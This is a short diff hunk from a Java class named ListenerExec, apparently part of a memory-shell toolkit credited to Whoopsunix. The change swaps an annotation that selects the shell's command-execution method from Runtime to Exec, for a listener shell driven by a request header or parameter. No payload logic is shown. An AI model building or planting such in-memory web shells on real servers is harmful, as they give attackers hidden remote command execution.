@@ -13,7 +13,7 @@ import java.lang.reflect.Method;
  * @author Whoopsunix
  */
 @MemShell(MemShell.Listener)
-@MemShellFunction(MemShellFunction.Runtime)
+@MemShellFunction(MemShellFunction.Exec)
 @JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
 public class ListenerExec implements InvocationHandler {
     private static String HEADER;
